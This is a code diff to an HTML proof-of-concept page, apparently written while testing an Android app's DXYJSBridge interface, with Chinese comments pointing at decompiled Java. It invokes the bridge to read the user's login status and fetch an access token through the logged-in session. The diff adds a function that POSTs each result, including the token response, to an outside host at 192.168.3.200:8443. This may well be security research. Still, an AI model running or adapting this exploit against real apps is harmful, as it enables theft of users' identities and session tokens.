@@ -6,6 +6,7 @@
 <script>
 var o = document.getElementById('o');
 function L(s){ o.textContent += '\n' + s; }
+function R(tag, data){ try{ fetch('https://192.168.3.200:8443/result', {method:'POST', body:'['+tag+'] '+data}).catch(function(){}); }catch(e){} }
 
 // ===== 自实现 shim (原生回调走 window.DXYJSBridge.callback, 见 q/r.java:63) =====
 window.DXYJSBridge = {
@@ -22,12 +23,12 @@ window.DXYJSBridge = {
 };
 
 L('href: ' + location.href);
-L('AndroidJSBridger: ' + (typeof window.AndroidJSBridger));
+L('AndroidJSBridger: ' + (typeof window.AndroidJSBridger)); R('ENV', 'bridger=' + (typeof window.AndroidJSBridger) + ' href=' + location.href);
 L('----------------------------------------');
 
 // 1) loginStatus → 用户身份
 DXYJSBridge.invoke('loginStatus', {}, function(res) {
-  L('[loginStatus] ' + JSON.stringify(res));
+  L('[loginStatus] ' + JSON.stringify(res)); R('LOGIN_STATUS', JSON.stringify(res));
 });
 
 // 2) getServerData → 以用户登录态调 API, 响应含 access token
@@ -36,7 +37,7 @@ DXYJSBridge.invoke('getServerData', {
   url: 'https://dxy.com/app/i/user/ask/att/upload/access',
   params: {}
 }, function(res) {
-  L('[accessToken API] ' + JSON.stringify(res).substring(0, 800));
+  L('[accessToken API] ' + JSON.stringify(res).substring(0, 800)); R('ACCESS_TOKEN_API', JSON.stringify(res).substring(0, 1500));
 });
 </script>
 </body></html>
